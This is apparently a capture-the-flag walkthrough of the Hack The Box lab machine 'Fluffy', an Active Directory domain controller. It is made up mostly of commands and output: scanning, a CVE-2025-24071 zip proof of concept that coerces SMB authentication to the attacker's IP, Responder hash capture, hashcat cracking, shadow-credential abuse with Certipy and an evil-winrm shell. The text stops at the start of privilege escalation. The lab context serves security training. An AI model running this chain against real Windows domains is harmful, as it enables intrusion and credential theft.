# Fluffy HTB Machine Walk-Through.

As always we’ll start off with an nmap scan.. This is alot of information.. So bare with me..

---

### Fluffy HTB Machine Walk-Through.

![](https://cdn-images-1.medium.com/max/800/1*u3h4mTlsdqo4bfw6b6FZBg.jpeg)

As always we’ll start off with an nmap scan.. This is alot of information.. So bare with me..

```

                                                                                ┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ nmap -p- -sV -sC -A -vvv 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 21:13 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Initiating Ping Scan at 21:13
Scanning 10.10.11.69 [4 ports]
Completed Ping Scan at 21:13, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:13
Completed Parallel DNS resolution of 1 host. at 21:13, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:13
Scanning 10.10.11.69 [65535 ports]
Discovered open port 445/tcp on 10.10.11.69
Discovered open port 139/tcp on 10.10.11.69
Discovered open port 53/tcp on 10.10.11.69
Discovered open port 49690/tcp on 10.10.11.69
Discovered open port 593/tcp on 10.10.11.69
SYN Stealth Scan Timing: About 15.05% done; ETC: 21:17 (0:02:55 remaining)
Discovered open port 49724/tcp on 10.10.11.69
Discovered open port 3268/tcp on 10.10.11.69
Discovered open port 5985/tcp on 10.10.11.69
Discovered open port 49692/tcp on 10.10.11.69
SYN Stealth Scan Timing: About 42.88% done; ETC: 21:16 (0:01:21 remaining)
Discovered open port 464/tcp on 10.10.11.69
Discovered open port 49707/tcp on 10.10.11.69
Discovered open port 49689/tcp on 10.10.11.69
Discovered open port 9389/tcp on 10.10.11.69
Discovered open port 3269/tcp on 10.10.11.69
Discovered open port 636/tcp on 10.10.11.69
Discovered open port 49666/tcp on 10.10.11.69
Discovered open port 389/tcp on 10.10.11.69
Discovered open port 88/tcp on 10.10.11.69
Completed SYN Stealth Scan at 21:15, 109.93s elapsed (65535 total ports)
Initiating Service scan at 21:15
Scanning 18 services on 10.10.11.69
Completed Service scan at 21:16, 55.23s elapsed (18 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.69
Retrying OS detection (try #2) against 10.10.11.69
Initiating Traceroute at 21:16
Completed Traceroute at 21:16, 0.14s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:16
Completed Parallel DNS resolution of 2 hosts. at 21:16, 0.03s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.11.69.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:16
NSE Timing: About 99.96% done; ETC: 21:16 (0:00:00 remaining)
Completed NSE at 21:17, 40.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:17
Completed NSE at 21:17, 1.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Nmap scan report for 10.10.11.69
Host is up, received echo-reply ttl 127 (0.091s latency).
Scanned at 2025-11-02 21:13:38 EST for 211s
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-03 09:15:34Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-03T09:17:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
|
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|
|_ssl-date: 2025-11-03T09:17:09+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|
|_ssl-date: 2025-11-03T09:17:09+00:00; +7h00m01s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-03T09:17:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=11/2%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=690810A5%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
SEQ(SP=F5%GCD=1%ISR=105%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=245 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 16145/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 23856/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-11-03T09:16:29
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   123.03 ms 10.10.14.1
2   123.04 ms 10.10.11.69

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.21 seconds
           Raw packets sent: 131224 (5.778MB) | Rcvd: 136 (6.580KB)
```

We find that the domain is Fluffy.htb and the host name is DC01. So let’s add this to our host file.

```
──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ echo "10.10.11.69 fluffy.htb DC01.fluffy.htb" | sudo tee -a /etc/hosts
[sudo] password for achilles:
10.10.11.69 fluffy.htb DC01.fluffy.htb
```

Also this Lab/Box comes with creds..credentials for the following account: j.fleischman / J0elTHEM4n1990! Let’s test these with certain services.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!

┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!

┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ netexec winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

They work with SMB, LDAP, but not WinRM.

```
certipy find -target fluffy.htb -dc-ip 10.10.11.69 \
  -username j.fleischman@fluffy.htb -password 'J0elTHEM4n1990!' -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251102214130_Certipy.txt'
[*] Wrote text output to '20251102214130_Certipy.txt'
[*] Saving JSON output to '20251102214130_Certipy.json'
[*] Wrote JSON output to '20251102214130_Certipy.json'

┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

I used bloodhound to get information about our user j.fleischman but that was a dead end, so i signed into smbclient and was able to find our foothold I believe.

```
smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT
Password for [j.fleischman@FLUFFY.HTB]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May 19 10:27:02 2025
  ..                                  D        0  Mon May 19 10:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

  5842943 blocks of size 4096. 1524663 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (265.6 KiloBytes/sec) (average 265.6 KiloBytes/sec)
smb: \> The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED

```

Well this is interesting. we get a pdf form that has some CVE’s that this system is affected by.. so lets find some POC’s if any are available. We’ll go to CVEDetails.com

![](https://cdn-images-1.medium.com/max/800/1*FsIe1cpiIJZBGDsLmwICbg.png)

![](https://cdn-images-1.medium.com/max/800/1*1GJi0FoBwauxOA74gwc6dA.png)

after exploring google for a bit i found a blog with an exploit that works.. here’s the link <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html" class="markup--anchor markup--p-anchor" data-href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html" rel="noopener" target="_blank">POC</a>

Set-up the file to upload onto the smb directory. Then set up Responder and wait for response.

```
sudo python3 poc.py
Enter your file name: malware.zip
Enter IP (EX: 192.168.1.162): 10.10.14.4
completed
```

```
smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT
Password for [j.fleischman@FLUFFY.HTB]:
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (1.2 kB/s) (average 1.3 kB/s)
smb: \> ls
  .                                   D        0  Tue Nov  4 01:38:28 2025
  ..                                  D        0  Tue Nov  4 01:38:28 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      329  Tue Nov  4 01:38:28 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

```

```
sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.4]
    Responder IPv6             [dead:beef:2::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-G47UXNDT3CI]
    Responder Domain Name      [U6L7.LOCAL]
    Responder DCE-RPC Port     [46374]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:0b193bf939460e9e:B7901098924BEAF60FC137FCC232B9E6:01010000000000008098BC07EE4CDC01D757BF8DB2BC8D3D0000000002000800550036004C00370001001E00570049004E002D00470034003700550058004E004400540033004300490004003400570049004E002D00470034003700550058004E00440054003300430049002E00550036004C0037002E004C004F00430041004C0003001400550036004C0037002E004C004F00430041004C0005001400550036004C0037002E004C004F00430041004C00070008008098BC07EE4CDC01060004000200000008003000300000000000000001000000002000003BAECDF4CD2CA6D21EFBCABDE9BC11846F23A82AB2F2A925D29F52FA7C405A5D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured has
```

Grab and save that hash to a file and then use john or hashcat to crack it..

```
hashcat hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 9 7900X 12-Core Processor, 15008/30017 MB (4096 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (26267 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:0b193bf939460e9e:b7901098924beaf60fc137fcc232b9e6:01010000000000008098bc07ee4cdc01d757bf8db2bc8d3d0000000002000800550036004c00370001001e00570049004e002d00470034003700550058004e004400540033004300490004003400570049004e002d00470034003700550058004e00440054003300430049002e00550036004c0037002e004c004f00430041004c0003001400550036004c0037002e004c004f00430041004c0005001400550036004c0037002e004c004f00430041004c00070008008098bc07ee4cdc01060004000200000008003000300000000000000001000000002000003baecdf4cd2ca6d21efbcabde9bc11846f23a82ab2f2a925d29f52fa7c405a5d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000:prometheusx-303

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:0b193bf939460e9e:b7901098924beaf60f...000000
Time.Started.....: Mon Nov  3 19:11:13 2025 (1 sec)
Time.Estimated...: Mon Nov  3 19:11:14 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2776.9 kH/s (1.37ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4521984/14344385 (31.52%)
Rejected.........: 0/4521984 (0.00%)
Restore.Point....: 4513792/14344385 (31.47%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: prrprr -> prison201068
Hardware.Mon.#01.: Util: 45%

Started: Mon Nov  3 19:11:03 2025
Stopped: Mon Nov  3 19:11:15 2025
```

We add that to our creds.txt file. Now we have his cred we can use p.agila to add ourselves to a few groups to eventually get WinRM_svc account.

![](https://cdn-images-1.medium.com/max/800/1*g6ZHL05aakoNVlkLs4HMAQ.png)

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.10.11.69 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

```
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1ce6135140d946c89901823765233035'
[*] Adding Key Credential with device ID '1ce6135140d946c89901823765233035' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '1ce6135140d946c89901823765233035' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600ed<snip>
```

Now we can use certipy to grab the hash for winrm_svc and ca_svc

```
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account ca_svc -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f0b95821f89d46b388d58663ab21fb89'
[*] Adding Key Credential with device ID 'f0b95821f89d46b388d58663ab21fb89' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'f0b95821f89d46b388d58663ab21fb89' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf5<snip>
```

Now we can use this to sign in evil-winrm and grab the user.txt flag.

```
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a<snip>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd /Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
3f663628cb53ddac00083969XXXXXXX
```

```

certipy find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53b<snip>" -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251105032459_Certipy.txt'
[*] Wrote text output to '20251105032459_Certipy.txt'
[*] Saving JSON output to '20251105032459_Certipy.json'
[*] Wrote JSON output to '20251105032459_Certipy.json'
```

Now cat that file and see what Certificate authorities we can use to get the administrator hash..

> **Privilege Escalation**

Step 1: Read the victim account’s initial UPN (optional — for later restoration)

```
──(achilles㉿Nicholas)-[~]
└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
